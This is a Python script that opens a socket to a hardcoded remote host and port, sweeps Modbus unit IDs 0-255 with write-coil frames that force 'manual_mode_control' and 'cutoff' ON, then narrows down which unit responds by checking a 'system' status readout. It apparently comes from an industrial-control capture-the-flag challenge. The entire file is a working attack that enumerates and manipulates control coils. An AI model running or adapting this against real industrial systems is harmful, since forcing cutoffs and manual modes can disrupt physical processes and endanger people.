#!/usr/bin/env python3
"""Single persistent connection:
1. Batch-write manual_mode_control ON across units 0-255 in chunks of 16.
2. Bisect within the changed chunk by writing `cutoff` ON per candidate
   unit and checking cutoff's OWN raw field in `system` output directly
   (no downstream ladder interlock dependency)."""
import socket
import time
import re

HOST = "154.57.164.66"
PORT = 30435


def recv_until_prompt(sock, timeout=8):
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            if b"cmd>" in buf:
                break
    except socket.timeout:
        pass
    return buf.decode(errors="replace")


def send(sock, line, timeout=6):
    sock.sendall(line.encode() + b"\n")
    time.sleep(0.15)
    return recv_until_prompt(sock, timeout=timeout)


def get_system(sock):
    return send(sock, "system")


def write_coil(sock, unit, addr_hex, on=True, timeout=3):
    val = "ff00" if on else "0000"
    frame = f"{unit:02x}05{addr_hex}{val}"
    return send(sock, f"modbus {frame}", timeout=timeout)


def field_is_on(resp, field):
    m = re.search(rf'"{field}":\s*(\d)', resp)
    return m and m.group(1) == "1"


def main():
    sock = socket.create_connection((HOST, PORT), timeout=10)
    print("BANNER:", recv_until_prompt(sock, timeout=8).strip())

    baseline = get_system(sock)
    print("BASELINE:", baseline.strip())
    print("=" * 70)

    chunk_size = 16
    changed_chunk = None

    for start in range(0, 256, chunk_size):
        chunk = list(range(start, min(start + chunk_size, 256)))
        for u in chunk:
            write_coil(sock, u, "00c8", on=True)  # manual_mode_control
        resp = get_system(sock)
        if resp != baseline:
            print(f"!!! CHANGE in chunk {chunk[0]}-{chunk[-1]} !!!")
            changed_chunk = chunk
            break
        else:
            print(f"units {chunk[0]}-{chunk[-1]}: no change")

    if not changed_chunk:
        print("No chunk changed state across 0-255.")
        sock.close()
        return

    print(f"\nBisecting chunk {changed_chunk[0]}-{changed_chunk[-1]} using cutoff's own field...")
    found = None
    for u in changed_chunk:
        write_coil(sock, u, "00ce", on=True)  # cutoff
        check = get_system(sock)
        if field_is_on(check, "cutoff"):
            print(f"*** UNIT {u} (0x{u:02x}) CONFIRMED - cutoff field flipped ON ***")
            print(check.strip())
            found = u
            break
        else:
            print(f"unit {u} (0x{u:02x}): no change")

    if found is None:
        print("Bisection did not pinpoint a unit within the chunk via cutoff.")
    else:
        print(f"\n>>> REAL UNIT ID = {found} (0x{found:02x}) <<<")

    sock.close()


if __name__ == "__main__":
    main()
